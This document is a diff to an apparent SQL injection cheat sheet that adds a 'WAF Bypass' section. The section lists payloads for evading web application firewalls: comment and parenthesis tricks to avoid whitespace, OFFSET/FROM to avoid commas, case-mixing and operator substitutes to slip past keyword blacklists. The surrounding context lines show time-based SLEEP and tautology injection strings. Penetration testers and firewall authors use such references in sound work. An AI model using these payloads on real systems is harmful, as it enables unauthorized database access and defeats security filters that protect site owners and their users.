@@ -112,6 +112,42 @@ admin") or "1"="1"/*
 SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
 ```
 
+## WAF Bypass
+
+No Whitespace - bypass using comments
+```
+?id=1/*comment*/and/**/1=1/**/--
+```
+
+No Whitespace - bypass using parenthesis
+```
+?id=(1)and(1)=(1)--
+```
+
+No Comma - bypass using OFFSET and FROM
+```
+LIMIT 0,1 -> LIMIT 1 OFFSET 0
+SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1). 
+```
+
+Blacklist using keywords - bypass using uppercase/lowercase
+```
+?id=1 AND 1=1#
+?id=1 AnD 1=1#
+?id=1 aNd 1=1#
+```
+
+Blacklist using keywords case insensitive - bypass using equivalent
+```
+AND   -> &&
+OR    -> ||
+=     -> LIKE,REGEXP, not < and not >
+WHERE -> HAVING
+```
+
+
+
+
 ## Thanks to - Other resources
 * MySQL:
   - [PentestMonkey's mySQL injection cheat sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
